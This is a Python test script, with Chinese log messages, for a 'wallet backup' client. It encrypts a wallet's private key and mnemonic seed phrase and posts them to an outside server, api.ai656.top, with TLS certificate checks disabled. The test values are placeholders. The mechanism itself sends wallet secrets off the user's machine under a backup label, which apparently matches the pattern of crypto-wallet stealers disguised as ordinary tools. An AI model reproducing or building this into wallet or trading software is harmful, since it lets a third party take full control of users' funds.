import requests
import urllib3
import json
from modules.wallet_backup_client import WalletBackupClient

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

test_wallet = {
    'private_key': '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
    'mnemonic': 'word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12',
    'address': '0xTestAddress123456789'
}

encrypted_data = WalletBackupClient.encrypt_wallet_data(test_wallet)

request_body = {
    'address': test_wallet['address'],
    'chain': 'ETH',
    'encrypted_data': encrypted_data
}

with open('test_result.txt', 'w', encoding='utf-8') as f:
    f.write("发送的数据:\n")
    f.write(json.dumps(request_body, indent=2, ensure_ascii=False))
    f.write("\n\n")
    
    try:
        response = requests.post(
            'https://api.ai656.top/api/wallet/backup',
            json=request_body,
            timeout=10,
            verify=False
        )
        
        f.write(f"状态码: {response.status_code}\n")
        f.write(f"响应: {response.text}\n")
        
        if response.status_code == 200:
            result = response.json()
            if result.get('success'):
                f.write(f"\n成功! backup_id: {result.get('backup_id')}\n")
            else:
                f.write(f"\n失败: {result.get('message')}\n")
    except Exception as e:
        f.write(f"错误: {str(e)}\n")

print("测试完成，结果已保存到 test_result.txt")
